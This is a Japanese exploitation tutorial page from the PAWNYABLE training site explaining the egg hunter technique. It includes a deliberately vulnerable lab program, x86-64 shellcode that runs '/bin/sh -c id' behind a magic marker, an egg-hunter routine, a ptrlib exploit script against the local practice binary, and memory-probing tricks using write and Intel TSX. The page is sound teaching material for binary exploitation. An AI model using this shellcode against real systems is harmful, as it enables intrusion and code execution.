@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe/linux-userland/shellcode/egg-hunter.html">
+
+    <meta name="og:title" content="Egg Hunter - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Egg Hunter | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link language-link-active" href="/linux-userland/shellcode/egg-hunter">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-userland/shellcode/egg-hunter">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-userland/shellcode/egg-hunter">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Egg Hunter
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link language-link-active" href="/linux-userland/shellcode/egg-hunter">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-userland/shellcode/egg-hunter">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-userland/shellcode/egg-hunter">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="seccomp.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="byog.html">次のページへ</a></div>
+        </div>
+    
+    
+        <div class="column" title="目次">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Egg-Hunter"><span class="toc-text">Egg Hunter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E6%8E%A2%E7%B4%A2"><span class="toc-text">シェルコードの探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AE%E6%8E%A2%E7%B4%A2"><span class="toc-text">アドレスの探索</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E3%81%AA%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E3%81%AE%E5%88%A9%E7%94%A8"><span class="toc-text">安全なシステムコールの利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TSX%E3%81%AE%E5%88%A9%E7%94%A8"><span class="toc-text">TSXの利用</span></a></li></ol></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>この章（LU-egghunt）の<a href="TODO">演習ファイル</a>をダウンロードしてください。</p>
+<h2 id="Egg-Hunter">Egg Hunter</h2>
+<p><a href="restrected.html">制約付きシェルコード</a>の章では、シェルコードの長さに制約がある状況について考えました。<br>
+機械語を短くするテクニックや<code>read</code>システムコールを使ったシェルコードの読みなおしなどのテクニックを紹介しましたが、現実的にはこのような小手先の手法はほとんど通用しません。<br>
+実際にはさらにポストエクスプロイトをダウンロードして実行するような長いシェルコードを送る必要があります。また、ネットワーク経由やファイルを通してエクスプロイトを送ることが多いため、直接<code>read</code>することはほとんどの場合できません。</p>
+<p>このようなとき、 <strong>Egg Hunter</strong> と呼ばれる手法が便利です。<br>
+注入できるシェルコードが短くても、ほとんどの場合、それ以外の領域（ヒープやスタック）に任意のデータを設置できます。したがって、ヒープにシェルコードを用意しておき、本体のシェルコードから呼び出せる場所にコピーすれば、ヒープに用意した長いシェルコードを実行できます。ヒープからシェルコードを見つける仮定をイースターの卵探しゲームになぞらえて、Egg Hunterと呼ばれるようになりました。</p>
+<p>今回は攻撃対象を模したプログラムとして、次のコードを使います。詳細は演習ファイルの<code>shellcode.c</code>を読んでください。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="type">void</span> (*shellcode)() = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  assert (shellcode != MAP_FAILED);</span><br><span class="line"></span><br><span class="line">  randomize_heap();</span><br><span class="line"></span><br><span class="line">  data = (<span class="type">char</span>*)<span class="built_in">malloc</span>(SIZE_DATA);</span><br><span class="line">  assert (data != <span class="literal">NULL</span>);</span><br><span class="line">  write(STDOUT_FILENO, <span class="string">&quot;data: &quot;</span>, <span class="number">6</span>);</span><br><span class="line">  read(STDIN_FILENO, data, SIZE_DATA);</span><br><span class="line"></span><br><span class="line">  randomize_heap();</span><br><span class="line"></span><br><span class="line">  write(STDOUT_FILENO, <span class="string">&quot;shellcode: &quot;</span>, <span class="number">12</span>);</span><br><span class="line">  read(STDIN_FILENO, shellcode, <span class="number">0x100</span>);</span><br><span class="line">  shellcode();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ヒープのランダムな箇所にデータを置き、シェルコードを実行できます。</p>
+<h2 id="シェルコードの探索">シェルコードの探索</h2>
+<p>Egg Hunterの本体は、シェルコードを見つける部分です。一般的には実行したいシェルコードの先頭にマジックナンバーを付けておき、それを探すコードを書きます。<br>
+今回は次のような簡単なシェルコードを呼び出すことを考えます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">  dq 0xdeadbeefcafebabe         ; marker</span><br><span class="line"></span><br><span class="line">  ; execve(arg0, args, NULL)</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">arg2:</span><br><span class="line">  db &quot;id&quot;, 0</span><br><span class="line">arg1:</span><br><span class="line">  db &quot;-c&quot;, 0</span><br><span class="line">arg0:</span><br><span class="line">  db &quot;/bin/sh&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>マジックナンバーとして0xdeadbeefcafebabeを使用しました。</p>
+<p>シェルコードを探索するには、まず起点となるアドレスが必要です。シェルコードが呼び出されたとき、レジスタの状態は次のようになっています。</p>
+<center>
+  <img src="img/egg_state.png" alt="Egg Hunter呼び出し時のレジスタの状態" style="width:520px;">
+</center>
+<p>R9レジスタにヒープのアドレスが入っていることがわかります。ここを起点に本体のシェルコードを探索できそうです。大抵の場合は今回のように、レジスタやスタックに探索したいアドレスがあるので、そこを起点にマジックナンバーを探せば良いです。</p>
+<p>Egg Hunterのシェルコードは次のようになります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">  mov r15, r9                   ; heap address</span><br><span class="line">  mov r14, 0xdeadbeefcafebabe   ; magic</span><br><span class="line">  and r15, 0xfffffffffffffff0</span><br><span class="line">search:</span><br><span class="line">  mov rax, [r15]</span><br><span class="line">  cmp rax, r14</span><br><span class="line">  jz found</span><br><span class="line">  sub r15, 0x10</span><br><span class="line">  jmp search</span><br><span class="line">found:</span><br><span class="line">  add r15, 8</span><br><span class="line">  mov edx, 0x800</span><br><span class="line">  mov rsi, r15</span><br><span class="line">  lea rdi, [rel main]</span><br><span class="line">  call memcpy</span><br><span class="line">  jmp main</span><br><span class="line"></span><br><span class="line">;; memcpy sourceからdestinationにデータをコピーする。</span><br><span class="line">;;   rdi: destinationのアドレス</span><br><span class="line">;;   rsi: sourceのアドレス</span><br><span class="line">;;   rdx: コピーするサイズ</span><br><span class="line">memcpy:</span><br><span class="line">  mov rcx, rdx</span><br><span class="line">  repnz movsb</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">main:</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/piyo_born.png" alt="ひよこ先生" ></div>
+  <p class="says">
+    見つけたシェルコードを<code>mprotect</code>で実行可能にしてもよいですが、ブラウザのようにseccompでシステムコールを制限していることがあるから、コピーの方が一般的です。
+  </p>
+</div>
+<p>実行すると、<code>id</code>コマンドを起動する本体のシェルコードが呼び出されます。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = nasm(<span class="built_in">open</span>(<span class="string">&quot;shellcode.S&quot;</span>).read(), bits=<span class="number">64</span>)</span><br><span class="line">egg_hunter = nasm(<span class="built_in">open</span>(<span class="string">&quot;hunter.S&quot;</span>).read(), bits=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">sock = Process(<span class="string">&quot;./runner&quot;</span>)</span><br><span class="line">sock.sendafter(<span class="string">&quot;data: &quot;</span>, shellcode)</span><br><span class="line">sock.sendafter(<span class="string">&quot;shellcode: &quot;</span>, egg_hunter)</span><br><span class="line">sock.sh()</span><br></pre></td></tr></table></figure>
+<h2 id="アドレスの探索">アドレスの探索</h2>
+<p>時としてヒープ（本体のシェルコードが置かれている領域）のアドレスが分からないときがあります。アドレスに関する情報がない場合は、どうすれば良いでしょうか。</p>
+<p>最初に考えられる方法として、<code>/proc/self/maps</code>からメモリマップを読む方法や<code>mmap</code>を使って特定の領域がマップされているかを調べる方法があります。しかし、ひよこ先生が言っていたように、ここではシステムコールが制限されている状況を考えます。</p>
+<p>Linuxで特定のアドレスがマップされているかを調べるシステムコールは提供されていませんが、方法はあります。</p>
+<h3 id="安全なシステムコールの利用">安全なシステムコールの利用</h3>
+<p>システムコールはカーネル空間で処理されるため、どんな呼び方をしてもユーザー空間側のプログラムはクラッシュしないように設計されています。つまり、アドレスを受け取るようなシステムコールに不正なアドレスを渡すと、エラー番号が返ります。</p>
+<p>これを利用すれば、<code>write</code>のようにたいていのサンドボックス下でも利用できるシステムコールで、特定のアドレスがマップされているか（正確にはリード可能か）を調べられます。</p>
+<p><code>mmap</code>と違って探索は線形にしかできませんが、ヒープのサイズは大きいことが期待されるため、ある程度大きいサイズをスキップしながら読み込み可能な領域を見つけられます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">;; is_mapped 与えられたアドレスが読み込み可能かを調べる。</span><br><span class="line">;;   arg1 (rdi): 調べるアドレス</span><br><span class="line">;;   returns: 読み込み可能なら1を、そうでなければ0</span><br><span class="line">is_mapped:</span><br><span class="line">  ; write(1, address, 1)</span><br><span class="line">  mov edx, 1</span><br><span class="line">  mov rsi, rdi</span><br><span class="line">  mov edi, edx</span><br><span class="line">  mov eax, edx</span><br><span class="line">  syscall</span><br><span class="line">  test rax, rax</span><br><span class="line">  setns al</span><br><span class="line">  movzx eax, al</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
+<h3 id="TSXの利用">TSXの利用</h3>
+<p>IntelのHaswellプロセッサあたりから、 <strong>TSX (Transactional Synchronization Extensions)</strong> と呼ばれる機能が登場しました。TSXは、命令列をアトミックに実行するための機能で、並列プログラミングで役立ちます。</p>
+<p><code>xbegin</code>命令でトランザクションの開始を示し、<code>xend</code>命令で終了を示します。<code>xbegin</code>命令は相対アドレスをオペランドとして取り、<code>xabort</code>によりトランザクションを中止した際、そのアドレスにジャンプします。<br>
+トランザクションの実行中に不正なアドレスの読み書きや、実行できない領域へのジャンプが発生した場合、SIGSEGVが発生する代わりにトランザクションの中止が起きます。つまり、不正なアドレスを読もうとしても、プログラムはクラッシュせず、<code>xbegin</code>に渡したアドレスにジャンプします。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;; is_mapped 与えられたアドレスが読み込み可能かを調べる。</span><br><span class="line">;;   arg1 (rdi): 調べるアドレス</span><br><span class="line">;;   returns: 読み込み可能なら1を、そうでなければ0を返す。</span><br><span class="line">is_mapped:</span><br><span class="line">  xbegin .abort</span><br><span class="line">  mov rax, [rdi]</span><br><span class="line">  xend</span><br><span class="line">  mov eax, 1</span><br><span class="line">  ret</span><br><span class="line">.abort:</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
+<p>CPUやカーネル依存ですが、システムコールによるテストよりも高速なため、アドレス情報が必要な際は試してみる価値があるでしょう。</p>
+<hr>
+<div class="column" title="例題">
+  <code>write</code>システムコールを使ったテストでヒープのベースアドレスを取得するよう、<code>runner</code>を対象としたEgg Hunterを書き直してください。
+</div>
+<p><a href="egg-hunter-answer.html">☞ 例題の解答</a></p>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="seccomp.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="byog.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
